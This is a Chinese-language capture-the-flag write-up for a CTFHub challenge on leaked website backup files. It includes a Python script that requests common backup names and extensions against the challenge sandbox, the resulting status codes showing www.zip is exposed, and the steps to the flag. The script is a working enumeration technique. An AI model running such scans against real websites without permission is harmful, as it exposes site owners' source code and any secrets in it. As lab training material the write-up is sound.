# CTFHUB_网站源码

## 题目内容

```
备份文件下载 - 网站源码

可能有点用的提示

常见的网站源码备份文件后缀
tar
tar.gz
zip
rar
常见的网站源码备份文件名
web
website
backup
back
www
wwwroot
temp
```



## WriteUp
既然给出了文件名和扩展名，那就直接写脚本来看一看

```python
import requests

name_list = ["web",
             "website",
             "backup",
             "back",
             "www",
             "wwwroot",
             "temp"]
app_list = ["tar",
            "tar.gz",
            "zip",
            "rar"]


for name in name_list:
    for app in app_list:
        result = requests.get("http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/"+name+"."+app)

        print("http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/"+name+"."+app ,result.status_code)
```

但是结果很奇葩，居然是直接全部404

```
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/web.tar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/web.tar.gz           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/web.zip           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/web.rar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/website.tar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/website.tar.gz           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/website.zip           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/website.rar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/backup.tar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/backup.tar.gz           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/backup.zip           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/backup.rar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/back.tar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/back.tar.gz           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/back.zip           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/back.rar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/www.tar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/www.tar.gz           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/www.zip           200
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/www.rar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/wwwroot.tar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/wwwroot.tar.gz           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/wwwroot.zip           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/wwwroot.rar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/temp.tar           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/temp.tar.gz           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/temp.zip           404
http://challenge-bdd47672318d6eec.sandbox.ctfhub.com:10800/temp.rar           404
```

www.zip为200,我们下载访问（写脚本的时候一定要细心！！）

![image-20210821225434730](/home/adian/note/Study_Note/网络安全/CTF/pic/8.png)

打开flag_Xxxx.txt

```
where is flag ??
```

浏览器打开flag_xxxx.txt成功拿到flag
